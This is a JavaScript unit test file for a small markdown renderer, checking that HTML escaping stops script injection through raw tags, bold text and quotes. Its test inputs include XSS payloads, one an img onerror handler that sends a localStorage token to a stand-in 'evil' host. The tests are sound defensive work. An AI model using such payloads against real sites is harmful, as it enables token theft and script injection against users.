// Run with: npm run test:unit   (node's built-in test runner, no extra deps)
import test from "node:test";
import assert from "node:assert/strict";
import { escapeHtml, renderMarkdownLite } from "./safeMarkdown.mjs";

test("escapeHtml neutralises every HTML-significant character", () => {
  assert.equal(escapeHtml(`<a href="x" onclick='y'>&</a>`), "&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;&lt;/a&gt;");
  assert.equal(escapeHtml(null), "");
  assert.equal(escapeHtml(undefined), "");
  assert.equal(escapeHtml(42), "42");
});

test("script tags and event handlers are rendered as inert text", () => {
  const out = renderMarkdownLite(`<img src=x onerror="fetch('//evil/'+localStorage.token)"><script>alert(1)</script>`);
  assert.ok(!out.includes("<img"), out);
  assert.ok(!out.includes("<script"), out);
  assert.ok(out.includes("&lt;img"), out);
  assert.ok(out.includes("&lt;script&gt;"), out);
});

test("bold and italic still work", () => {
  assert.equal(
    renderMarkdownLite("Charge **Porto** at *night*"),
    'Charge <strong style="color:var(--text)">Porto</strong> at <em>night</em>',
  );
});

test("bold content cannot smuggle markup", () => {
  const out = renderMarkdownLite("**<b onmouseover=alert(1)>x</b>**");
  assert.ok(!out.includes("<b "), out);
  assert.equal(out, '<strong style="color:var(--text)">&lt;b onmouseover=alert(1)&gt;x&lt;/b&gt;</strong>');
});

test("italic can be disabled (dispatch copilot only uses bold)", () => {
  assert.equal(renderMarkdownLite("2 * 3 * 4", { italic: false }), "2 * 3 * 4");
});

test("an attribute-breaking quote inside bold stays escaped", () => {
  const out = renderMarkdownLite('**" onmouseover="alert(1)**');
  assert.ok(!out.includes('" onmouseover'), out);
});
